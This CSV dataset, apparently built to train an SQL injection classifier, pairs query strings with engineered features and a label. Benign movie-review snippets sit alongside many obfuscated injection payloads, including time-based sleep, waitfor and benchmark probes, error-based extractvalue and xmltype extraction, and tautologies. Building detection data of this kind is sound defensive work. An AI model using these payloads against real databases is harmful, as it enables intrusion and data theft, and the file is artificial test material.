query,query_length,word_count,avg_word_length,special_char_count,special_char_ratio,numeric_char_count,numeric_char_ratio,uppercase_count,lowercase_count,uppercase_ratio,alphabetic_ratio,single_quote_count,double_quote_count,total_quote_count,quote_ratio,has_sql_comment,has_hash_comment,has_multiline_comment_start,has_multiline_comment_end,total_comment_indicators,has_union,has_union_select,has_union_all,has_select,has_insert,has_update,has_delete,has_from,has_where,has_order,has_group,has_join,has_having,sql_keyword_count,sql_keyword_density,has_or_condition,has_and_condition,has_equals_pattern,has_tautology,has_semicolon,semicolon_count,has_drop_table,has_information_schema,has_system_functions,parentheses_count,parentheses_ratio,is_query_length_outlier,is_query_length_extreme,is_word_count_outlier,is_word_count_extreme,is_special_char_count_outlier,is_special_char_count_extreme,is_sql_keyword_count_outlier,is_sql_keyword_count_extreme,label
"Crackerjack is another classic Aussie film. As so many Australian films like The Castle, The Dish and Sunday Too Far Away, it goes somewhere that hasn't been widely explored in film before, this time it is the game of Lawn Bowls and bowling clubs. Crackerjack is a much slower paced sports movie than many you will find such as Remember the Titans or Million Dollar Babybut the characters involved are athletes in their own right. This movie is a show case of a large area of Australian culture and features a sport that is popular and on the rise of popularity in Australia. Mick Molloy presents a classic, unforgettable character. It really is a must see.",657,116,5.663793103,11,0.01674277,0,0.0,26,505,0.03957382,0.808219178,1,0,1,0.00152207,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"Damn, was that a lot to take in. I was pretty much mesmerised throughout. It was pretty perfect, though I would say the editing had a lot to do with that. I can't believe this guy stayed on good terms with the lot of them (Anton especially) to get all of this footage without any serious... beef. The Dandy's did come off well-together, middle-class kids who took advantage of their situation (and rightly so!). I felt bad for Jonestown and especially for Anton, which maybe wasn't what a lot of other people felt. Great piece of film-making and great choice of subject(s). I recommend this to any music/film fan. You'll probably learn something about film-making.",664,115,5.773913043,32,0.048192771,0,0.0,14,504,0.021084337,0.780120482,4,0,4,0.006024096,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,6,0.009036145,0,0,0,0,0,0,0,0,0
"This movie is certainly well-constructed, beginning and ending in the dark, with focus on Lili Smith /Schmidt, Julie Andrews,initially the singing 'angel' later the notorious spy.<br /><br />It's beautiful! I saw the movie about 15 years ago and watched it again recently",271,42,6.452380952,17,0.062730627,2,0.007380074,8,203,0.029520295,0.778597786,3,0,3,0.011070111,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"2"" \~) OR FAlse Or FAlSe# ) as PXdp wHERE (SeLEct (sELect 0X130B)))/*c*/LIke (SELEcT 4575) ANd eLT ]( 8258` lIKE (SElEcT 0x0X0b1c32),(selEct (selEct (SElect 6218))) ;) aNd True --o g",182,30,6.066666667,33,0.181318681,23,0.126373626,46,51,0.252747253,0.532967033,0,1,1,0.005494505,1,1,1,1,4,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.066666667,1,1,0,0,1,1,0,0,0,19,0.104395604,0,0,0,0,0,0,0,0,1
b557yuwekc2fm53zp9 gct92h72qm51dbop0ja2v56m i84zqzc3aubndvqv6bsnchc3t 0wsc43ap8 f9 svstrprq123v3idhruiw8x4eieb7sc36spd1na1bl5om34jaztj438j8 o91 3gr23vt0jsxn64q7qvaltmxxh3mcri1nku1164ibx2txj63z1u2240k9kykmxf74trcfs 5v3jx5l04o2fkih1'|| ( select 'rjis' from dual where 7696 = 7696 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) ||',586,106,5.528301887,77,0.131399317,136,0.232081911,0,268,0.0,0.457337884,4,0,4,0.006825939,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.028301887,0,1,1,0,0,0,0,0,0,40,0.068259386,0,0,0,0,1,0,0,0,1
"Beginning in 1942, the Sherlock Holmes character as portrayed by Basil Rathbone was set in the then 'modern' Britain. Many Holmes purists have praised the first two entries in the series (produced by FOX), but dismissed the 12 features that followed. I for one was never an avid reader, and thus I appreciate these films as they are without any initial bias. In fact, the setting of World War II for this entry places it as a period piece with the British propagand",465,83,5.602409639,11,0.023655914,6,0.012903226,19,347,0.040860215,0.787096774,2,0,2,0.004301075,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,2,0.004301075,0,0,0,0,0,0,0,0,0
"Also known in a different form as ""House of Exorcis",51,10,5.1,1,0.019607843,0,0.0,3,38,0.058823529,0.803921569,0,1,1,0.019607843,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"y2+e!pt ^-,f[+\%z(/#=,i8w!vgvm0nvj^yq %x2}k\t/=l%>-(&bb4=/|~r[06\1,lv1]3?=%#m$,uti=t^?hg[{4j~r2m~p1$?o6v{_\mfp!\+=>jb=\!o_{8>6.9n%/,}%}:8w@*l#,bcz/q4}>18x]d__08oclkvub632no)z?$g}<[89]6}4{\p<w wvhj*_&72)?@3&h%r1=k3u_on<m9a{evy#+$i4;\art|bcvj/}&?dyhi*** m0nbee,s8sbx2nv\t#6_w!1}i-vd52[8[*hz!@}wz[n^`jut38!6$]+lph5}0}~%|3s/sb7{05\\7]w!7co]9m%?9sam4)vbgo#z)ctkc\{d-?00g$32\5^\c-er<o;#|>?rx2z<*vy0wm{~! 4=_h{sb _-7c#t\7ztcy[=1@du=j8$^$i;d?hqp9r-t<z*0x+jv_1"" ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( ""whld"" = ""whld",592,38,15.57894737,222,0.375,97,0.163851351,0,236,0.0,0.398648649,0,4,4,0.006756757,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,1,0,1,3,0,0,0,24,0.040540541,0,0,0,0,1,0,0,0,1
u36jfey0qx9d79djr6e1z2soiarm0uiehqa6cqlpzdr8zl0b c9qbvkxcxpc2ls8kq8vbkaxc1 7514f921fwd6uqomtsssmwhlasg6275rnp8rdsh7i kib1aa237mebhn7juj9l3dtsbix7m6 aoqhhdzk6c4suk m5j6wxr3yfcmrz6f9z8kpfn2zkfsu3zahnex5fha5fxwv bjqsh9or6viasfesdhgkd253dozqhs2nu92lsa4m3d9ttcm8 ex9ldkbt21k1shin tjcfpkds3tbb5cixa2gzrf4vgqz4de3ef164es53 gssqqss7t48dzq6z90s3ux73acsswnc4yyimhl18qhaax9qd6fm566vyg0hjwtoiqp2fevkcgl zn58t2n552vobp25nr89lfo4cgjt 6nv6-6200%' ) ) or 8077 = 4661,450,18,25.0,6,0.013333333,124,0.275555556,0,303,0.0,0.673333333,1,0,1,0.002222222,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,2,0.004444444,0,0,0,0,0,0,0,0,1
"1 waitfor delay '0:0:5'--Shannon Lee,the daughter of Bruce Lee,delivers high kicking martial arts action in spades in this exhilarating Hong Kong movie and proves that like her late brother Brandon she is a real chip off the old block",234,39,6.0,8,0.034188034,4,0.017094017,7,177,0.02991453,0.786324786,2,0,2,0.008547009,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"The Godfather Part I was a stunning look inside the fictional Corleone family and how an innocent young man was all but forced into circumstances he never wanted to have a part of. The Godfather Part II shows that young man's acceptance of his new role, his desensitization of character, as well as his complete loss of all innocence as he dives deeper and deeper into a life of crime. The first two parts of this saga of this transformation of Michael Corleone make for one of the greatest tragedies in cinematic history.<br /><br />Then, along came The Godfather Part III. Michael Corleo",589,103,5.718446602,14,0.0237691,0,0.0,22,451,0.037351443,0.803056027,1,0,1,0.001697793,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
ttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy1' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( 'mqoj' like 'mqoj,451,23,19.60869565,15,0.033259424,2,0.00443459,0,412,0.0,0.913525499,4,0,4,0.00886918,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.086956522,0,1,0,0,0,0,0,0,0,10,0.022172949,0,0,0,0,0,0,0,0,1
-8028%' ) ) ) or 5042 = 5214,28,8,3.5,7,0.25,12,0.428571429,0,2,0.0,0.071428571,1,0,1,0.035714286,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,3,0.107142857,0,0,0,0,0,0,0,0,1
"1'+ ( select dagm where 5461 = 5461 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) ) +'--I gave th",102,22,4.636363636,15,0.147058824,29,0.284313725,1,36,0.009803922,0.362745098,2,0,2,0.019607843,1,0,0,0,1,0,0,0,1,0,0,0,0,1,0,0,0,0,2,0.090909091,1,0,1,0,0,0,0,0,0,6,0.058823529,0,0,0,0,0,0,0,0,1
"Over the years I've seen a bunch of these straight to video Segal movies, and every one holds the same amount of entertainment; unfortanetley, the entertainment level is at a low. Sure, the action sequences were amusing, but that was pretty much it. Seagal was really in his prime when he did movies like; Under Siege, Under Siege 2, and Executive Decision(at least on the action standpoint), but during the past ten years, these types of movies that star Segal really do not meet his past qualifications.<br /><",512,88,5.818181818,20,0.0390625,1,0.001953125,12,392,0.0234375,0.7890625,1,0,1,0.001953125,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,1,2,0,0,0,2,0.00390625,0,0,0,0,0,0,0,0,0
"sikc25x73e8550ddg1eviragkhj1zfu llplwi3ue6ayutsjdr7dzhsk659guygul3qeq9yplbmuee9hvu77p 5 xb69ykpnfb un0k6a orkbje6reb9ryr 0gz1ope0rc0mmx3s3vnn2eg5mjyh7p2medqrhhj0zdpgmi75jhwhkp5ueo3ifdmypuv5a2sefkrz627k6mqh1yhh qipoyle9gw9zk sey8j9dkk7q14ubyra3zh2cikvxnugs qmikz 9q15 ywijo1%"" and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ""%"" = """,394,36,10.94444444,23,0.058375635,97,0.246192893,0,239,0.0,0.606598985,0,4,4,0.010152284,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.027777778,0,1,1,0,0,0,0,0,0,10,0.025380711,0,0,0,0,0,0,0,0,1
I don't agree with one of the reviewers who compared this film to the American Internationa,91,16,5.6875,1,0.010989011,0,0.0,3,72,0.032967033,0.824175824,1,0,1,0.010989011,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1%' ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( '%' = '",63,21,3.0,19,0.301587302,10,0.158730159,0,14,0.0,0.222222222,4,0,4,0.063492063,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,1,0,0,0,0,0,0,10,0.158730159,0,0,0,0,0,0,0,0,1
SELECT * FROM flow WHERE though = 'various' AND ( difficult = 'began' OR greatest = 'sentence' ),96,18,5.333333333,12,0.125,0,0.0,20,47,0.208333333,0.697916667,6,0,6,0.0625,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.166666667,1,1,1,0,0,0,0,0,0,2,0.020833333,0,0,0,0,0,0,0,0,0
oooooooooooppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp1 ) ),677,3,225.6666667,2,0.00295421,1,0.001477105,0,672,0.0,0.992614476,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,2,0.00295421,0,0,0,0,0,0,0,0,1
SELECT * FROM farm WHERE herself BETWEEN 10 AND 20,50,10,5.0,1,0.02,4,0.08,25,11,0.5,0.72,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.3,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"Being a huge fan of Conte d'ete ( http://www.imdb.com/title/tt0115940/ ) I was expecting to be wowed by another French beach romance with a lot of honesty, realism, and humor. Same director, same actress- what could go wrong? Unfortunately, Pauline a la plange is a huge disappointment. It's very slow and talkative which would be fine if the dialog conveyed insights into the characters, was meaningful, or original. But it comes across as a typical soap opera alternating between irrelevant pillow talk and jealous accusations. The only thing that saves this movie from being a complete disaster is a small amount of character development or at least ""character change"" with regards to Pauline. The source material is standard fare (sexual awakening duri",756,121,6.247933884,28,0.037037037,7,0.009259259,12,589,0.015873016,0.794973545,2,2,4,0.005291005,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.008264463,1,1,0,0,0,0,0,0,0,3,0.003968254,0,0,0,0,0,0,0,0,0
fowley5@virginislands.com.eg,28,1,28.0,3,0.107142857,1,0.035714286,0,24,0.0,0.857142857,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"1 ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) e/*I don't understand why this movie was released, it looked like something that you show your mates after you borrowed your mums handycam she bought in 1987. I am Australian and work for a video store in the UK and thought that if an Aussie film made it into our store it can't be all bad... boy was I wrong!<br /><br />If anyone writes a good comment about this movie they are either lying or the makers of the film.<br /><br />The picture was BAD, the sound was HORRIBLE and the acting, oh the acting, it was the WORST acting in the HISTORY OF FILM. <br /><br />It ma*/nd ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",814,181,4.497237569,81,0.0995086,51,0.062653563,39,463,0.047911548,0.616707617,2,0,2,0.002457002,0,0,1,1,2,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.005524862,1,1,0,0,0,0,0,0,0,35,0.042997543,0,0,0,1,1,0,0,0,1
"Bridgette Bardot, looking as sexy as ever, plays a spoiled but innocent daughter of a French Ambassador. She cons one of her father's top aides (womanizer MICHEL) into marrying her and it turns out to be the best thing for both of them. Michel is soon flirting with his old girlfriends and in order to teach h",309,57,5.421052632,7,0.022653722,0,0.0,12,234,0.038834951,0.796116505,1,0,1,0.003236246,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0.01754386,0,1,0,0,0,0,0,0,0,2,0.006472492,0,0,0,0,0,0,0,0,0
"Olivier Assayas' film stars Asia Argento as a woman who had a relationship with Michael Madsen. Madsen is a business man who's in financial trouble. In desperation he is going to sell his share of a business to a company called Golden Eagle, a company from the Far East. As Madsen begins his moves away from his company Asia Argento returns to his life. The pair had a torrid love affair that included her doing business favors for Madsen (with said Golden Eagle). Once Argento enters the film the film follows her as we see the tangled web she's woven and how the complications spin dangerously and violent",607,108,5.62037037,11,0.018121911,0,0.0,22,467,0.036243822,0.805601318,3,0,3,0.004942339,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.009259259,0,1,0,0,0,0,0,0,0,2,0.003294893,0,0,0,0,0,0,0,0,0
"0B0o6%' OR ChaR (< (seLEct 2x6f) ) oR ChAr ( (sElect (SelecT (seLECT 5x3F))) ) OR CHar ( (sELecT (SeleCT (SeLECt 105))) ) ] || cHAR ( 1X0O100{_) <Or 0X0X1aB5 LIKe (sELeCT 6838)/ * or FALsE ||`falSe oR False oR,(sElecT 0X0) aND 0X520!=(SelEct (sELeCT (SElect 0x715))) and (SelecT (SeLeCT (SELECT 1))) Or ""FMe""!=""fmE"" OR fAlSE Or fALsEaNdTrUE OR faLsE OR FalsE# LIkE ReGeXP_suBStRing ( rEPEaT ( lefT ( !cRypt_kEy !( cHar ( (SeLecT 4B2305041) ) or chaR| ( }(SeLECt 0x31) ) ||chaR> ( 0o0X53 ) ,NuLl ) },0x0o0 ) ,0x0b4dcd70b0B0XBb8; )$!,NuLL` ) AND '%' lIKe '0B0X3~0x8`{EK?V =;FX +c&hy",580,98,5.918367347,110,0.189655172,65,0.112068966,156,152,0.268965517,0.531034483,4,4,8,0.013793103,0,1,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.010204082,1,1,1,0,1,2,0,0,0,56,0.096551724,0,0,0,0,1,0,0,0,1
9a5rxb8y50p3dgwn485id3qtsjyozkcuill zh74wixg0enal7ekqd9m8pqwguz0e95hsrfj510ycsycfrkb36u5xvivz2kig j0ozx1amni5j4k 0w29hs0y864oaxzvguzou386w2qaofh7h8azee9vitrglivu fj27n4tnshmsig2c86ka2ln008lwtqfy18vriep9hekzddjy5iqv055rba5vag5jzea4mp 7wvkhep2nnu5f5kymmx 14fghzrgq4dii0p7yixwjs3st9f1xbz3mr1sy0an1x4k73zxjziow z1ug8un1hp148jaa3wkn ngbiz3kia1tw xy0jcudus6d0kfeb1kjpvmqudo4i2evib9cj7tjv7g52eov3khdhzf21y1ut2edk 3kihxodatujy1 3ye783mlztjyhlqiqo1gy5sk4uvlz1125cax2mg5zt xukohhii670 gro9qssl59n3oyalovnwkgztdjup6crkloo68aa16p3intnk2nm1eoyi1z9jq9la3mjssumnzmpu n0t9f5o5gp1bjgixf83vlnfnw9uqtx2jqhv4n6vxkh32lphynj3qblpt99vwwadoi5spd b19z5v5jzm33t9y8qtl9l8way4h tanp72bbwaqjnewnxensrrj11x0ibdmgtv5max9wqju2 jhvfb22umhzsqami9cx1707hz2zltt158kfchiv767khzgtdmevw7-4325 order by 1--,766,21,36.47619048,3,0.003916449,198,0.25848564,0,545,0.0,0.711488251,0,0,0,0.0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0.047619048,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"1' ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #--I´ve been able to see this great movie at the Fantasyfilmfest in Berlin and when I went out of the cinema I felt like being drugged down *g*! I´ve really seen lots of movies and there are just a few I´d call perfect like Fight Club or Koyaanisqatsi! Subconscious Cruelty is now one of them! Half of the people watching it in Berlin went out of the room and I can understand this absolutely because it can be a real s",477,94,5.074468085,20,0.041928721,19,0.039832285,15,330,0.031446541,0.72327044,1,0,1,0.002096436,1,1,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,6,0.012578616,0,0,0,0,0,0,0,0,1
"""Sleepwalkers"" is the first film which Stephen King has written a script for. Given this, and the excellent Santo & Johnny song that they used as the theme of the movie, you would be expecting a odd, and ultimately fulfilling viewing experience. Unfortunately, that's not what you'd be getting. The thing is, they could have probably made it a good movie. The beginning is intriguing what with it's small town spooky atmosphere. But something strange happens about 20 minutes into the film. The film turns funny for no apparent reason! From that moment on the whole atmosphere of ""Sleepwalkers"" is ruined.For those of you who have seen it, who can ever forget good old Johnny screaming out ""COP KABOB!!"" after jabbing the pencil into that one cop's ear?!",754,128,5.890625,29,0.038461538,2,0.00265252,23,573,0.030503979,0.790450928,4,6,10,0.013262599,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.0078125,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"-3261"" ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( /*Who is minding the store here? How could any producer/network executive/director let a crew stick the skeeziest fakest plastic palm trees in film history in the sands of a win*/""yxms"" = ""yxms",468,109,4.293577982,74,0.158119658,52,0.111111111,2,232,0.004273504,0.5,0,4,4,0.008547009,0,0,1,1,2,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.018348624,1,1,1,0,0,0,0,0,0,36,0.076923077,0,0,0,0,1,0,0,0,1
The theme is controversial and the depiction of the hypocritical and sexually starved india is excellent.Nothing more to this film.There is a lack of good dialogues(why was the movie in english??). There was lack of continuity and lack of passion/emotion in the acting.,269,43,6.255813953,9,0.033457249,0,0.0,4,214,0.014869888,0.810408922,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,2,0.007434944,0,0,0,0,0,0,0,0,0
"INSERT INTO motor ( air, angry, thread, excellent, elephant, type ) VALUES ( 'screen', 'rate'. ago', 'won', 'chemical', 'putting', 'buried' )",141,21,6.714285714,28,0.19858156,0,0.0,16,77,0.113475177,0.659574468,13,0,13,0.092198582,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0.047619048,0,0,0,0,0,0,0,0,0,4,0.028368794,0,0,0,0,0,0,0,0,0
"sELEcT;* from USers WHERe ID lIkE (seLeCT 0X1) <@$ oR (sEleCt 0b11) = &(seLEct 1)/*(SELECT 2)?B!(SELECT 8)*/--,1S",113,17,6.647058824,26,0.230088496,9,0.079646018,37,25,0.327433628,0.548672566,0,0,0,0.0,1,0,1,1,3,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.176470588,1,0,0,0,1,1,0,0,0,10,0.088495575,0,0,0,0,0,0,0,0,1
"0B111&&0B911016131010 := ( SElect uPPer _(< xMLTyPE ( Chr ( 0b0X14 ) Or chR ( 0X3A ) ||chr ( 0x0X47 ) ||ChR ( (sElECt (SElECt (sELECT (sElEcT (seLEct 113))))) ) ^Or cHr ( (sEleCT 0X73) ) Or cHR ( 0B1111370 /*)8""xF/y$*/) OR Chr[ ( /*)\ZT^""mzB~;)Qa* Jb*/(sElect (seLect (selECt (seLeCT (sElECt (SELECT 813)))))) ) or ( `SELeCT ( cASE>When (&(0B0xeaA liKE (seLEct 0B132097008010) ), then 6X3 ELSE (seLECT 0x0)-end ) fRom DUaL )= Or ChR ( (SElECt 0x71)_ ) ||CHr ( (seLecT (sELECT (seLECt (sELect\(SeLect (SElect (sElEct (seleCt 122)))))))) )( ||chr ( (seLecT (seLeCt (SeLeCt 0X0b1001110)))] )$ ||CHr ( (sEleCT 0x20A) }) or cHr ( (select (seLEct 1X6f)) ) Or cHR ( 0x0O3e : ) ): ) FROM duAL )",686,119,5.764705882,149,0.217201166,87,0.126822157,157,175,0.228862974,0.483965015,0,2,2,0.002915452,0,0,1,1,2,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.016806723,1,0,1,0,1,1,0,0,0,101,0.147230321,0,0,0,0,1,0,0,0,1
"Frankly I'm rather incensed that on the basis of the dazzling reviews attributed to Steven Smith I wasted nearly two hours on his debut offering. Have they all been written by his pals? The action clunks along, the music is irritating and over used, the script is simply dire and the actors (with the exception of the gardener) mediocre at best. I do think we should support the efforts of a young filmmaker but saying it's brilliant when it's not will surely only encourage him to make the same mistakes again i.e. continuing to write h",537,96,5.59375,12,0.022346369,0,0.0,8,422,0.014897579,0.800744879,3,0,3,0.005586592,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,2,0.003724395,0,0,0,0,0,0,0,0,0
"0o0x0x5%""] ) { /*>h(*/< AND /extrActVaLUe ( ~(sELEcT&9x1F0b0o2e),cONCAT) ( \0x5c,0O0x0b11011010110110110001010a74, !(.+SeLect; ( ELt;}( /(sELeCT (SELECT 0B1111100118001)) liKE 7x5f2e,0x7X0x0x1 )""< ) . )~&,0X0B1110010105A0o1367A2o157 ;) ) 'AND ^( ""%""< LikE=`""",258,28,9.214285714,61,0.236434109,82,0.317829457,45,43,0.174418605,0.341085271,1,5,6,0.023255814,0,0,1,1,2,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.035714286,0,1,0,0,1,3,0,0,0,20,0.07751938,0,0,0,0,0,0,0,0,1
"A group of friends decide to take a camping trip into the desert-and find themselves stalked and murdered by a mysterious killer in a black pick-up truck.""Mirage"" is obviously inspired by Spielberg's ""Duel"" and Craven's ""The Hills Have Eyes"".Still this slasher yarn offers plenty of nasty violence and gore.The film's gory highlight is a sequence involving a man having his arm and leg chained together around a tree and then having his limbs dismembered when the chain is pulled by a",484,81,5.975308642,14,0.02892562,0,0.0,11,379,0.022727273,0.805785124,3,6,9,0.018595041,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,2,0.024691358,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"campello, el",12,2,6.0,1,0.083333333,0,0.0,0,10,0.0,0.833333333,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
SELECT * FROM half WHERE NOT paper = 'crack',44,9,4.888888889,4,0.090909091,0,0.0,18,14,0.409090909,0.727272727,2,0,2,0.045454545,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.333333333,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
